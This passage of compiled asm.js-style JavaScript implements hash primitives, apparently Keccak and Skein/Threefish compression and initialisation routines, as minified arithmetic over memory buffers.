            w = c[w + 4 >> 2] | 0;
            F = $;
            E = c[F >> 2] | 0;
            F = c[F + 4 >> 2] | 0;
            N = ea;
            M = c[N >> 2] | 0;
            N = c[N + 4 >> 2] | 0;
            h = v & ~Ba ^ Ca;
            i = w & ~d ^ e;
            n = ia;
            c[n >> 2] = h;
            c[n + 4 >> 2] = i;
            n = E & ~v ^ Ba;
            o = F & ~w ^ d;
            z = R;
            c[z >> 2] = n;
            c[z + 4 >> 2] = o;
            v = M & ~E ^ v;
            w = N & ~F ^ w;
            z = W;
            c[z >> 2] = v;
            c[z + 4 >> 2] = w;
            E = Ca & ~M ^ E;
            F = e & ~N ^ F;
            z = $;
            c[z >> 2] = E;
            c[z + 4 >> 2] = F;
            M = Ba & ~Ca ^ M;
            N = d & ~e ^ N;
            e = ea;
            c[e >> 2] = M;
            c[e + 4 >> 2] = N;
            e = ja;
            d = c[e >> 2] | 0;
            e = c[e + 4 >> 2] | 0;
            Ca = S;
            Ba = c[Ca >> 2] | 0;
            Ca = c[Ca + 4 >> 2] | 0;
            z = X;
            x = c[z >> 2] | 0;
            z = c[z + 4 >> 2] | 0;
            H = aa;
            G = c[H >> 2] | 0;
            H = c[H + 4 >> 2] | 0;
            P = fa;
            O = c[P >> 2] | 0;
            P = c[P + 4 >> 2] | 0;
            j = x & ~Ba ^ d;
            k = z & ~Ca ^ e;
            p = ja;
            c[p >> 2] = j;
            c[p + 4 >> 2] = k;
            p = G & ~x ^ Ba;
            q = H & ~z ^ Ca;
            Aa = S;
            c[Aa >> 2] = p;
            c[Aa + 4 >> 2] = q;
            x = O & ~G ^ x;
            z = P & ~H ^ z;
            Aa = X;
            c[Aa >> 2] = x;
            c[Aa + 4 >> 2] = z;
            G = d & ~O ^ G;
            H = e & ~P ^ H;
            Aa = aa;
            c[Aa >> 2] = G;
            c[Aa + 4 >> 2] = H;
            O = Ba & ~d ^ O;
            P = Ca & ~e ^ P;
            e = fa;
            c[e >> 2] = O;
            c[e + 4 >> 2] = P;
            e = 4112 + (Q << 3) | 0;
            Ca = a;
            d = c[Ca >> 2] ^ c[e >> 2];
            e = c[Ca + 4 >> 2] ^ c[e + 4 >> 2];
            Ca = a;
            c[Ca >> 2] = d;
            c[Ca + 4 >> 2] = e;
            Q = Q + 1 | 0
        } while ((Q | 0) != (b | 0));
        return
    }

    function Pa(b, d, e) {
        b = b | 0;
        d = d | 0;
        e = e | 0;
        var f = 0,
            g = 0,
            h = 0;
        h = l;
        l = l + 208 | 0;
        f = h;
        g = f;
        d = g + 76 | 0;
        do {
            a[g >> 0] = a[b >> 0] | 0;
            g = g + 1 | 0;
            b = b + 1 | 0
        } while ((g | 0) < (d | 0));
        g = f + 80 | 0;
        d = g + 120 | 0;
        do {
            c[g >> 2] = 0;
            g = g + 4 | 0
        } while ((g | 0) < (d | 0));
        b = f + 72 | 0;
        g = b;
        c[g >> 2] = c[b >> 2];
        c[g + 4 >> 2] = 1;
        g = f + 128 | 0;
        c[g >> 2] = 0;
        c[g + 4 >> 2] = -2147483648;
        Oa(f, 24);
        Db(e | 0, f | 0, 200) | 0;
        l = h;
        return
    }

    function Qa(b, e, f, g) {
        b = b | 0;
        e = e | 0;
        f = f | 0;
        g = g | 0;
        var h = 0,
            i = 0,
            j = 0,
            k = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0;
        u = l;
        l = l + 416 | 0;
        t = u + 288 | 0;
        s = u;
        if ((b | 0) < 513) {
            c[s >> 2] = 512;
            i = s + 8 | 0;
            c[i >> 2] = b;
            r = b + -224 | 0;
            switch (r >>> 5 | r << 27 | 0) {
                case 9:
                    {
                        q = s + 32 | 0;h = 4496;r = q + 64 | 0;do {
                            c[q >> 2] = c[h >> 2];
                            q = q + 4 | 0;
                            h = h + 4 | 0
                        } while ((q | 0) < (r | 0));
                        break
                    }
                case 5:
                    {
                        q = s + 32 | 0;h = 4432;r = q + 64 | 0;do {
                            c[q >> 2] = c[h >> 2];
                            q = q + 4 | 0;
                            h = h + 4 | 0
                        } while ((q | 0) < (r | 0));
                        break
                    }
                case 1:
                    {
                        q = s + 32 | 0;h = 4368;r = q + 64 | 0;do {
                            c[q >> 2] = c[h >> 2];
                            q = q + 4 | 0;
                            h = h + 4 | 0
                        } while ((q | 0) < (r | 0));
                        break
                    }
                case 0:
                    {
                        q = s + 32 | 0;h = 4304;r = q + 64 | 0;do {
                            c[q >> 2] = c[h >> 2];
                            q = q + 4 | 0;
                            h = h + 4 | 0
                        } while ((q | 0) < (r | 0));
                        break
                    }
                default:
                    {
                        h = s + 16 | 0;c[h >> 2] = 0;c[h + 4 >> 2] = 0;h = s + 24 | 0;c[h >> 2] = 0;c[h + 4 >> 2] = -1006632960;c[s + 12 >> 2] = 0;h = t;c[h >> 2] = 859916371;c[h + 4 >> 2] = 1;h = t + 8 | 0;c[h >> 2] = b;c[h + 4 >> 2] = 0;h = s + 32 | 0;q = t + 16 | 0;r = q + 48 | 0;do {
                            c[q >> 2] = 0;
                            q = q + 4 | 0
                        } while ((q | 0) < (r | 0));q = h;r = q + 64 | 0;do {
                            c[q >> 2] = 0;
                            q = q + 4 | 0
                        } while ((q | 0) < (r | 0));Ra(i, t, 1, 32)
                    }
            }
            r = s + 16 | 0;
            c[r >> 2] = 0;
            c[r + 4 >> 2] = 0;
            r = s + 24 | 0;
            c[r >> 2] = 0;
            c[r + 4 >> 2] = 1879048192;
            c[s + 12 >> 2] = 0
        } else {
            c[s >> 2] = 1024;
            k = s + 8 | 0;
            c[k >> 2] = b;
            if ((b | 0) == 1024) {
                q = s + 32 | 0;
                h = 4560;
                r = q + 128 | 0;
                do {
                    c[q >> 2] = c[h >> 2];
                    q = q + 4 | 0;
                    h = h + 4 | 0
                } while ((q | 0) < (r | 0));
                j = s + 16 | 0;
                i = s + 24 | 0;
                h = s + 12 | 0
            } else {
                j = s + 16 | 0;
                i = j;
                c[i >> 2] = 0;
                c[i + 4 >> 2] = 0;
                i = s + 24 | 0;
                h = i;
                c[h >> 2] = 0;
                c[h + 4 >> 2] = -1006632960;
                h = s + 12 | 0;
                c[h >> 2] = 0;
                q = t;
                c[q >> 2] = 859916371;
                c[q + 4 >> 2] = 1;
                q = t + 8 | 0;
                c[q >> 2] = b;
                c[q + 4 >> 2] = 0;
                b = s + 32 | 0;
                q = t + 16 | 0;
                r = q + 112 | 0;
                do {
                    c[q >> 2] = 0;
                    q = q + 4 | 0
                } while ((q | 0) < (r | 0));
                q = b;
                r = q + 128 | 0;
                do {
                    c[q >> 2] = 0;
                    q = q + 4 | 0
                } while ((q | 0) < (r | 0));
                Sa(k, t, 1, 32)
            }
            r = j;
            c[r >> 2] = 0;
            c[r + 4 >> 2] = 0;
            r = i;
            c[r >> 2] = 0;
            c[r + 4 >> 2] = 1879048192;
            c[h >> 2] = 0
        }
        h = f & 7;
        a: do
                if (!h) switch ((c[s >> 2] | 0) >>> 8 & 3) {
                    case 2:
                        {
                            k = s + 8 | 0;h = f >>> 3;b = s + 12 | 0;i = c[b >> 2] | 0;
                            if ((i + h | 0) >>> 0 > 64) {
                                if (i) {
                                    j = 64 - i | 0;
                                    if (j) {
                                        Db(k + 88 + i | 0, e | 0, j | 0) | 0;
                                        c[b >> 2] = 64;
                                        h = h - j | 0;
                                        e = e + j | 0
                                    }
                                    Ra(k, s + 96 | 0, 1, 64);
                                    c[b >> 2] = 0
                                }
                                i = (h + -1 | 0) >>> 6;
                                j = i << 6;
                                if (h >>> 0 > 64) {
                                    Ra(k, e, i, 64);
                                    h = h - j | 0;
                                    e = e + j | 0
                                }
                            }
                            if (!h) {
                                e = 0;
                                break a
                            }
                            r = c[b >> 2] | 0;Db(k + 88 + r | 0, e | 0, h | 0) | 0;c[b >> 2] = r + h;e = 0;
                            break a
                        }
                    case 1:
                        {
                            k = s + 8 | 0;h = f >>> 3;b = s + 12 | 0;i = c[b >> 2] | 0;
                            if ((i + h | 0) >>> 0 > 32) {
                                if (i) {
                                    j = 32 - i | 0;
                                    if (j) {
                                        Db(k + 56 + i | 0, e | 0, j | 0) | 0;
                                        c[b >> 2] = 32;
                                        h = h - j | 0;
                                        e = e + j | 0
                                    }
                                    Ta(k, s + 64 | 0, 1, 32);
                                    c[b >> 2] = 0
                                }
                                i = (h + -1 | 0) >>> 5;
                                j = i << 5;
                                if (h >>> 0 > 32) {
                                    Ta(k, e, i, 32);
                                    h = h - j | 0;
                                    e = e + j | 0
                                }
                            }
                            if (!h) {
                                e = 0;
                                break a
                            }
                            r = c[b >> 2] | 0;Db(k + 56 + r | 0, e | 0, h | 0) | 0;c[b >> 2] = r + h;e = 0;
                            break a
                        }
                    case 0:
                        {
                            b = s + 8 | 0;h = f >>> 3;k = s + 12 | 0;i = c[k >> 2] | 0;
                            if ((i + h | 0) >>> 0 > 128) {
                                if (i) {
                                    j = 128 - i | 0;
                                    if (j) {
                                        Db(s + 160 + i | 0, e | 0, j | 0) | 0;
                                        c[k >> 2] = 128;
                                        h = h - j | 0;
                                        e = e + j | 0
                                    }
                                    Sa(b, s + 160 | 0, 1, 128);
                                    c[k >> 2] = 0
                                }
                                i = (h + -1 | 0) >>> 7;
                                j = i << 7;
                                if (h >>> 0 > 128) {
                                    Sa(b, e, i, 128);
                                    h = h - j | 0;
                                    e = e + j | 0
                                }
                            }
                            if (!h) {
                                e = 0;
                                break a
                            }
                            r = c[k >> 2] | 0;Db(s + 160 + r | 0, e | 0, h | 0) | 0;c[k >> 2] = r + h;e = 0;
                            break a
                        }
                    default:
                        {
                            e = 1;
                            break a
                        }
                } else {
                    j = f >>> 3;
                    r = 1 << (h ^ 7);
                    a[t >> 0] = (d[e + j >> 0] | 0) & 0 - r | r;
                    b: do switch ((c[s >> 2] | 0) >>> 8 & 3) {
                            case 2:
                                {
                                    b = s + 8 | 0;k = s + 12 | 0;h = c[k >> 2] | 0;
                                    if ((h + j | 0) >>> 0 > 64) {
                                        if (!h) h = j;
                                        else {
                                            i = 64 - h | 0;
                                            if (!i) h = j;
                                            else {
                                                Db(b + 88 + h | 0, e | 0, i | 0) | 0;
                                                c[k >> 2] = 64;
                                                h = j - i | 0;
                                                e = e + i | 0
                                            }
                                            Ra(b, s + 96 | 0, 1, 64);
                                            c[k >> 2] = 0
                                        }
                                        i = (h + -1 | 0) >>> 6;
                                        j = i << 6;
                                        if (h >>> 0 > 64) {
                                            Ra(b, e, i, 64);
                                            i = h - j | 0;
                                            e = e + j | 0;
                                            h = c[k >> 2] | 0
                                        } else {
                                            i = h;
                                            h = 0
                                        }
                                    } else i = j;
                                    if (i) {
                                        Db(b + 88 + h | 0, e | 0, i | 0) | 0;
                                        h = h + i | 0;
                                        c[k >> 2] = h
                                    }
                                    if ((h + 1 | 0) >>> 0 > 64) {
                                        e = 64 - h | 0;
                                        if (!e) {
                                            h = 1;
                                            e = t
                                        } else {
                                            Db(b + 88 + h | 0, t | 0, e | 0) | 0;
                                            c[k >> 2] = 64;
                                            h = 1 - e | 0;
                                            e = t + e | 0
                                        }
                                        Ra(b, s + 96 | 0, 1, 64);
                                        c[k >> 2] = 0;
                                        i = (h + -1 | 0) >>> 6;
                                        j = i << 6;
                                        if (h >>> 0 > 64) {
                                            Ra(b, e, i, 64);
                                            h = h - j | 0;
                                            e = e + j | 0
                                        }
                                        if (!h) {
                                            m = 94;
                                            break b
                                        }
                                        i = h;
                                        h = c[k >> 2] | 0
                                    } else {
                                        i = 1;
                                        e = t
                                    }
                                    Db(b + 88 + h | 0, e | 0, i | 0) | 0;c[k >> 2] = h + i;m = 94;
                                    break
                                }
                            case 1:
                                {
                                    b = s + 8 | 0;k = s + 12 | 0;h = c[k >> 2] | 0;
                                    if ((h + j | 0) >>> 0 > 32) {
                                        if (!h) h = j;
                                        else {
                                            i = 32 - h | 0;
                                            if (!i) h = j;
                                            else {
                                                Db(b + 56 + h | 0, e | 0, i | 0) | 0;
                                                c[k >> 2] = 32;
                                                h = j - i | 0;
                                                e = e + i | 0
                                            }
                                            Ta(b, s + 64 | 0, 1, 32);
                                            c[k >> 2] = 0
                                        }
                                        i = (h + -1 | 0) >>> 5;
                                        j = i << 5;
                                        if (h >>> 0 > 32) {
                                            Ta(b, e, i, 32);
                                            i = h - j | 0;
                                            e = e + j | 0;
                                            h = c[k >> 2] | 0
                                        } else {
                                            i = h;
                                            h = 0
                                        }
                                    } else i = j;
                                    if (i) {
                                        Db(b + 56 + h | 0, e | 0, i | 0) | 0;
                                        h = h + i | 0;
                                        c[k >> 2] = h
                                    }
                                    if ((h + 1 | 0) >>> 0 > 32) {
                                        e = 32 - h | 0;
                                        if (!e) {
                                            h = 1;
                                            e = t
                                        } else {
                                            Db(b + 56 + h | 0, t | 0, e | 0) | 0;
                                            c[k >> 2] = 32;
                                            h = 1 - e | 0;
                                            e = t + e | 0
                                        }
                                        Ta(b, s + 64 | 0, 1, 32);
                                        c[k >> 2] = 0;
                                        i = (h + -1 | 0) >>> 5;
                                        j = i << 5;
                                        if (h >>> 0 > 32) {
                                            Ta(b, e, i, 32);
                                            h = h - j | 0;
                                            e = e + j | 0
                                        }
                                        if (!h) {
                                            m = 94;
                                            break b
                                        }
                                        i = h;
                                        h = c[k >> 2] | 0
                                    } else {
                                        i = 1;
                                        e = t
                                    }
                                    Db(b + 56 + h | 0, e | 0, i | 0) | 0;c[k >> 2] = h + i;m = 94;
                                    break
                                }
                            case 0:
                                {
                                    b = s + 8 | 0;k = s + 12 | 0;h = c[k >> 2] | 0;
                                    if ((h + j | 0) >>> 0 > 128) {
                                        if (!h) h = j;
                                        else {
                                            i = 128 - h | 0;
                                            if (!i) h = j;
                                            else {
                                                Db(s + 160 + h | 0, e | 0, i | 0) | 0;
                                                c[k >> 2] = 128;
                                                h = j - i | 0;
                                                e = e + i | 0
                                            }
                                            Sa(b, s + 160 | 0, 1, 128);
                                            c[k >> 2] = 0
                                        }
                                        i = (h + -1 | 0) >>> 7;
                                        j = i << 7;
                                        if (h >>> 0 > 128) {
                                            Sa(b, e, i, 128);
                                            i = h - j | 0;
                                            e = e + j | 0;
                                            h = c[k >> 2] | 0
                                        } else {
                                            i = h;
                                            h = 0
                                        }
                                    } else i = j;
                                    if (i) {
                                        Db(s + 160 + h | 0, e | 0, i | 0) | 0;
                                        h = h + i | 0;
                                        c[k >> 2] = h
                                    }
                                    if ((h + 1 | 0) >>> 0 > 128) {
                                        e = 128 - h | 0;
                                        if (!e) {
                                            h = 1;
                                            e = t
                                        } else {
                                            Db(s + 160 + h | 0, t | 0, e | 0) | 0;
                                            c[k >> 2] = 128;
                                            h = 1 - e | 0;
                                            e = t + e | 0
                                        }
                                        Sa(b, s + 160 | 0, 1, 128);
                                        c[k >> 2] = 0;
                                        i = (h + -1 | 0) >>> 7;
                                        j = i << 7;
                                        if (h >>> 0 > 128) {
                                            Sa(b, e, i, 128);
                                            h = h - j | 0;
                                            e = e + j | 0
                                        }
                                        if (!h) {
                                            m = 94;
                                            break b
                                        }
                                        i = h;
                                        h = c[k >> 2] | 0
                                    } else {
                                        i = 1;
                                        e = t
                                    }
                                    Db(s + 160 + h | 0, e | 0, i | 0) | 0;c[k >> 2] = h + i;m = 94;
                                    break
                                }
                            default:
                                e = 1
                        }
                        while (0);
                        if ((m | 0) == 94) {
                            e = s + 24 | 0;
                            q = e;
                            r = c[q + 4 >> 2] | 8388608;
                            c[e >> 2] = c[q >> 2];
                            c[e + 4 >> 2] = r;
                            e = 0
                        }
                }
            while (0);
            switch ((c[s >> 2] | 0) >>> 8 & 3) {
                case 2:
                    {
                        f = s + 8 | 0;n = s + 24 | 0;r = n;h = c[r + 4 >> 2] | -2147483648;o = n;c[o >> 2] = c[r >> 2];c[o + 4 >> 2] = h;o = s + 12 | 0;h = c[o >> 2] | 0;
                        if (h >>> 0 < 64) xb(f + 88 + h | 0, 0, 64 - h | 0) | 0;p = s + 96 | 0;Ra(f, p, 1, h);k = ((c[f >> 2] | 0) + 7 | 0) >>> 3;q = p;r = q + 64 | 0;do {
                            c[q >> 2] = 0;
                            q = q + 4 | 0
                        } while ((q | 0) < (r | 0));m = s + 32 | 0;q = t;h = m;r = q + 64 | 0;do {
                            c[q >> 2] = c[h >> 2];
                            q = q + 4 | 0;
                            h = h + 4 | 0
                        } while ((q | 0) < (r | 0));
                        if (k | 0) {
                            j = s + 16 | 0;
                            b = (k + -1 | 0) >>> 6;
                            i = 0;
                            h = 0;
                            while (1) {
                                q = p;
                                c[q >> 2] = i;
                                c[q + 4 >> 2] = 0;
                                q = j;
                                c[q >> 2] = 0;
                                c[q + 4 >> 2] = 0;
                                q = n;
                                c[q >> 2] = 0;
                                c[q + 4 >> 2] = -16777216;
                                c[o >> 2] = 0;
                                Ra(f, p, 1, 8);
                                q = k - h | 0;
                                Db(g + h | 0, m | 0, (q >>> 0 < 64 ? q : 64) | 0) | 0;
                                q = m;
                                h = t;
                                r = q + 64 | 0;
                                do {
                                    c[q >> 2] = c[h >> 2];
                                    q = q + 4 | 0;
                                    h = h + 4 | 0
                                } while ((q | 0) < (r | 0));
                                h = i + 1 | 0;
                                if ((i | 0) == (b | 0)) break;
                                else {
                                    i = h;
                                    h = h << 6
                                }
                            }
                        }
                        l = u;
                        return e | 0
                    }
                case 1:
                    {
                        k = s + 8 | 0;m = s + 24 | 0;r = m;h = c[r + 4 >> 2] | -2147483648;f = m;c[f >> 2] = c[r >> 2];c[f + 4 >> 2] = h;f = s + 12 | 0;h = c[f >> 2] | 0;
                        if (h >>> 0 < 32) xb(k + 56 + h | 0, 0, 32 - h | 0) | 0;n = s + 64 | 0;Ta(k, n, 1, h);j = ((c[k >> 2] | 0) + 7 | 0) >>> 3;c[n >> 2] = 0;c[n + 4 >> 2] = 0;c[n + 8 >> 2] = 0;c[n + 12 >> 2] = 0;c[n + 16 >> 2] = 0;c[n + 20 >> 2] = 0;c[n + 24 >> 2] = 0;c[n + 28 >> 2] = 0;b = s + 32 | 0;c[t >> 2] = c[b >> 2];c[t + 4 >> 2] = c[b + 4 >> 2];c[t + 8 >> 2] = c[b + 8 >> 2];c[t + 12 >> 2] = c[b + 12 >> 2];c[t + 16 >> 2] = c[b + 16 >> 2];c[t + 20 >> 2] = c[b + 20 >> 2];c[t + 24 >> 2] = c[b + 24 >> 2];c[t + 28 >> 2] = c[b + 28 >> 2];
                        if (j | 0) {
                            i = s + 16 | 0;
                            h = 0;
                            do {
                                s = n;
                                c[s >> 2] = h;
                                c[s + 4 >> 2] = 0;
                                s = i;
                                c[s >> 2] = 0;
                                c[s + 4 >> 2] = 0;
                                s = m;
                                c[s >> 2] = 0;
                                c[s + 4 >> 2] = -16777216;
                                c[f >> 2] = 0;
                                Ta(k, n, 1, 8);
                                s = j - h | 0;
                                Db(g + h | 0, b | 0, (s >>> 0 < 32 ? s : 32) | 0) | 0;
                                c[b >> 2] = c[t >> 2];
                                c[b + 4 >> 2] = c[t + 4 >> 2];
                                c[b + 8 >> 2] = c[t + 8 >> 2];
                                c[b + 12 >> 2] = c[t + 12 >> 2];
                                c[b + 16 >> 2] = c[t + 16 >> 2];
                                c[b + 20 >> 2] = c[t + 20 >> 2];
                                c[b + 24 >> 2] = c[t + 24 >> 2];
                                c[b + 28 >> 2] = c[t + 28 >> 2];
                                h = h + 32 | 0
                            } while (j >>> 0 > h >>> 0)
                        }
                        l = u;
                        return e | 0
                    }
                case 0:
                    {
                        f = s + 8 | 0;n = s + 24 | 0;r = n;h = c[r + 4 >> 2] | -2147483648;o = n;c[o >> 2] = c[r >> 2];c[o + 4 >> 2] = h;o = s + 12 | 0;h = c[o >> 2] | 0;
                        if (h >>> 0 < 128) xb(s + 160 + h | 0, 0, 128 - h | 0) | 0;p = s + 160 | 0;Sa(f, p, 1, h);k = ((c[f >> 2] | 0) + 7 | 0) >>> 3;q = p;r = q + 128 | 0;do {
                            c[q >> 2] = 0;
                            q = q + 4 | 0
                        } while ((q | 0) < (r | 0));m = s + 32 | 0;q = t;h = m;r = q + 128 | 0;do {
                            c[q >> 2] = c[h >> 2];
                            q = q + 4 | 0;
                            h = h + 4 | 0
                        } while ((q | 0) < (r | 0));
                        if (k | 0) {
                            j = s + 16 | 0;
                            b = (k + -1 | 0) >>> 7;
                            i = 0;
                            h = 0;
                            while (1) {
                                q = p;
                                c[q >> 2] = i;
                                c[q + 4 >> 2] = 0;
                                q = j;
                                c[q >> 2] = 0;
                                c[q + 4 >> 2] = 0;
                                q = n;
                                c[q >> 2] = 0;
                                c[q + 4 >> 2] = -16777216;
                                c[o >> 2] = 0;
                                Sa(f, p, 1, 8);
                                q = k - h | 0;
                                Db(g + h | 0, m | 0, (q >>> 0 < 128 ? q : 128) | 0) | 0;
                                q = m;
                                h = t;
                                r = q + 128 | 0;
                                do {
                                    c[q >> 2] = c[h >> 2];
                                    q = q + 4 | 0;
                                    h = h + 4 | 0
                                } while ((q | 0) < (r | 0));
                                h = i + 1 | 0;
                                if ((i | 0) == (b | 0)) break;
                                else {
                                    i = h;
                                    h = h << 7
                                }
                            }
                        }
                        l = u;
                        return e | 0
                    }
                default:
                    {
                        l = u;
                        return e | 0
                    }
            }
        return 0
    }

    function Ra(a, b, e, f) {
        a = a | 0;
        b = b | 0;
        e = e | 0;
        f = f | 0;
        var g = 0,
            h = 0,
            i = 0,
            j = 0,
            k = 0,
            l = 0,
            m = 0,
            n = 0,
            o = 0,
            p = 0,
            q = 0,
            r = 0,
            s = 0,
            t = 0,
            u = 0,
            v = 0,
            w = 0,
            x = 0,
            z = 0,
            A = 0,
            B = 0,
            C = 0,
            D = 0,
            E = 0,
            F = 0,
            G = 0,
            H = 0,
            I = 0,
            J = 0,
            K = 0,
            L = 0,
            M = 0,
            N = 0,
            O = 0,
            P = 0,
            Q = 0,
            R = 0,
            S = 0,
            T = 0,
            U = 0,
            V = 0,
            W = 0,
            X = 0,
            Y = 0,
            Z = 0,
            _ = 0,
            $ = 0,
            aa = 0,
            ba = 0,
            ca = 0,
            da = 0,
            ea = 0,
            fa = 0,
            ga = 0,
            ha = 0,
            ia = 0,
            ja = 0,
            ka = 0,
            la = 0,
            ma = 0,
            na = 0,
            oa = 0,
            pa = 0,
            qa = 0,
            ra = 0,
            sa = 0,
            ta = 0,
            ua = 0,
            va = 0,
            wa = 0,
            xa = 0,
            ya = 0,
            za = 0,
            Aa = 0,
            Ba = 0,
            Ca = 0,
            Da = 0,
            Ea = 0,
            Fa = 0,
            Ga = 0,
            Ha = 0,
            Ia = 0,
            Ja = 0,
            Ka = 0,
            La = 0,
            Ma = 0,
            Na = 0,
            Oa = 0,
            Pa = 0,
            Qa = 0;
        M = a + 8 | 0;
        D = M;
        N = c[D >> 2] | 0;
        D = c[D + 4 >> 2] | 0;
        E = a + 16 | 0;
        o = E;
        n = c[o >> 2] | 0;
        o = c[o + 4 >> 2] | 0;
        F = a + 24 | 0;
        G = a + 32 | 0;
        H = a + 40 | 0;
        I = a + 48 | 0;
        J = a + 56 | 0;
        K = a + 64 | 0;
        L = a + 72 | 0;
        A = a + 80 | 0;
        B = wb(e + -1 | 0, 0, 1, 0) | 0;
        B = Bb(B | 0, y | 0, f | 0, 0) | 0;
        C = y;
        s = F;
        u = G;
        w = H;
        z = I;
        g = J;
        i = K;
        k = L;
        m = A;
        a = c[g >> 2] | 0;
        g = c[g + 4 >> 2] | 0;
        h = c[i >> 2] | 0;
        i = c[i + 4 >> 2] | 0;
        j = c[k >> 2] | 0;
        k = c[k + 4 >> 2] | 0;
        l = c[m >> 2] | 0;
        m = c[m + 4 >> 2] | 0;
        p = N;
        q = D;
        r = c[s >> 2] | 0;
        s = c[s + 4 >> 2] | 0;
        t = c[u >> 2] | 0;
        u = c[u + 4 >> 2] | 0;
        v = c[w >> 2] | 0;
        w = c[w + 4 >> 2] | 0;
        x = c[z >> 2] | 0;
        z = c[z + 4 >> 2] | 0;
        while (1) {
            p = wb(p | 0, q | 0, f | 0, 0) | 0;
            q = y;
            qa = r ^ -1443096030 ^ t ^ v ^ x ^ a ^ h ^ j ^ l;
            ra = s ^ 466688986 ^ u ^ w ^ z ^ g ^ i ^ k ^ m;
            ma = p ^ n;
            oa = q ^ o;
            na = b;
            pa = na;
            pa = d[pa >> 0] | d[pa + 1 >> 0] << 8 | d[pa + 2 >> 0] << 16 | d[pa + 3 >> 0] << 24;
            na = na + 4 | 0;
            na = d[na >> 0] | d[na + 1 >> 0] << 8 | d[na + 2 >> 0] << 16 | d[na + 3 >> 0] << 24;
            ja = b + 8 | 0;
            la = ja;
            la = d[la >> 0] | d[la + 1 >> 0] << 8 | d[la + 2 >> 0] << 16 | d[la + 3 >> 0] << 24;
            ja = ja + 4 | 0;
            ja = d[ja >> 0] | d[ja + 1 >> 0] << 8 | d[ja + 2 >> 0] << 16 | d[ja + 3 >> 0] << 24;
            fa = b + 16 | 0;
            ha = fa;
            ha = d[ha >> 0] | d[ha + 1 >> 0] << 8 | d[ha + 2 >> 0] << 16 | d[ha + 3 >> 0] << 24;
            fa = fa + 4 | 0;
            fa = d[fa >> 0] | d[fa + 1 >> 0] << 8 | d[fa + 2 >> 0] << 16 | d[fa + 3 >> 0] << 24;
            ba = b + 24 | 0;
            da = ba;
            da = d[da >> 0] | d[da + 1 >> 0] << 8 | d[da + 2 >> 0] << 16 | d[da + 3 >> 0] << 24;
            ba = ba + 4 | 0;
            ba = d[ba >> 0] | d[ba + 1 >> 0] << 8 | d[ba + 2 >> 0] << 16 | d[ba + 3 >> 0] << 24;
            Z = b + 32 | 0;
            $ = Z;
            $ = d[$ >> 0] | d[$ + 1 >> 0] << 8 | d[$ + 2 >> 0] << 16 | d[$ + 3 >> 0] << 24;
            Z = Z + 4 | 0;
            Z = d[Z >> 0] | d[Z + 1 >> 0] << 8 | d[Z + 2 >> 0] << 16 | d[Z + 3 >> 0] << 24;
            V = b + 40 | 0;
            X = V;
            X = d[X >> 0] | d[X + 1 >> 0] << 8 | d[X + 2 >> 0] << 16 | d[X + 3 >> 0] << 24;
            V = V + 4 | 0;
            V = d[V >> 0] | d[V + 1 >> 0] << 8 | d[V + 2 >> 0] << 16 | d[V + 3 >> 0] << 24;
            R = b + 48 | 0;
            T = R;
            T = d[T >> 0] | d[T + 1 >> 0] << 8 | d[T + 2 >> 0] << 16 | d[T + 3 >> 0] << 24;
            R = R + 4 | 0;
            R = d[R >> 0] | d[R + 1 >> 0] << 8 | d[R + 2 >> 0] << 16 | d[R + 3 >> 0] << 24;
            O = b + 56 | 0;
            P = O;
            P = d[P >> 0] | d[P + 1 >> 0] << 8 | d[P + 2 >> 0] << 16 | d[P + 3 >> 0] << 24;
            O = O + 4 | 0;
            O = d[O >> 0] | d[O + 1 >> 0] << 8 | d[O + 2 >> 0] << 16 | d[O + 3 >> 0] << 24;
            Ha = wb(pa | 0, na | 0, r | 0, s | 0) | 0;
            Q = y;
            Ia = wb(la | 0, ja | 0, t | 0, u | 0) | 0;
            xa = y;
            Fa = wb(ha | 0, fa | 0, v | 0, w | 0) | 0;
            Pa = y;
            ka = wb(da | 0, ba | 0, x | 0, z | 0) | 0;
            ia = y;
            aa = wb($ | 0, Z | 0, a | 0, g | 0) | 0;
            _ = y;
            W = wb(h | 0, i | 0, p | 0, q | 0) | 0;
            Y = y;
            U = wb(W | 0, Y | 0, X | 0, V | 0) | 0;
            wa = y;
            sa = wb(P | 0, O | 0, l | 0, m | 0) | 0;
            ya = y;
            Q = wb(Ha | 0, Q | 0, Ia | 0, xa | 0) | 0;
            Ha = y;
            S = zb(Ia | 0, xa | 0, 46) | 0;
            ga = y;
            xa = yb(Ia | 0, xa | 0, 18) | 0;
            xa = (S | xa) ^ Q;
            ga = (ga | y) ^ Ha;
            Pa = wb(Fa | 0, Pa | 0, ka | 0, ia | 0) | 0;
            Fa = y;
            S = zb(ka | 0, ia | 0, 36) | 0;
            Ia = y;
            ia = yb(ka | 0, ia | 0, 28) | 0;
            ia = (S | ia) ^ Pa;
            Ia = (Ia | y) ^ Fa;
            _ = wb(aa | 0, _ | 0, U | 0, wa | 0) | 0;
            aa = y;
            S = zb(U | 0, wa | 0, 19) | 0;
            ka = y;
            wa = yb(U | 0, wa | 0, 45) | 0;
            wa = (S | wa) ^ _;
            ka = (ka | y) ^ aa;
            S = wb(j | 0, k | 0, n | 0, o | 0) | 0;
            U = y;
            va = wb(S | 0, U | 0, T | 0, R | 0) | 0;
            va = wb(va | 0, y | 0, sa | 0, ya | 0) | 0;
            ua = y;
            za = zb(sa | 0, ya | 0, 37) | 0;
            Ga = y;
            ya = yb(sa | 0, ya | 0, 27) | 0;
            ya = (za | ya) ^ va;
            Ga = (Ga | y) ^ ua;
            Fa = wb(Pa | 0, Fa | 0, xa | 0, ga | 0) | 0;
            Pa = y;
            za = zb(xa | 0, ga | 0, 33) | 0;
            sa = y;
            ga = yb(xa | 0, ga | 0, 31) | 0;
            ga = (za | ga) ^ Fa;
            sa = (sa | y) ^ Pa;
            aa = wb(ya | 0, Ga | 0, _ | 0, aa | 0) | 0;
            _ = y;
            za = zb(ya | 0, Ga | 0, 27) | 0;
            xa = y;
            Ga = yb(ya | 0, Ga | 0, 37) | 0;
            Ga = (za | Ga) ^ aa;
            xa = (xa | y) ^ _;
            ua = wb(wa | 0, ka | 0, va | 0, ua | 0) | 0;
            va = y;
            za = zb(wa | 0, ka | 0, 14) | 0;
            ya = y;
            ka = yb(wa | 0, ka | 0, 50) | 0;
            ka = (za | ka) ^ ua;
            ya = (ya | y) ^ va;
            Ha = wb(ia | 0, Ia | 0, Q | 0, Ha | 0) | 0;
            Q = y;
            za = zb(ia | 0, Ia | 0, 42) | 0;
            wa = y;
            Ia = yb(ia | 0, Ia | 0, 22) | 0;
            Ia = (za | Ia) ^ Ha;
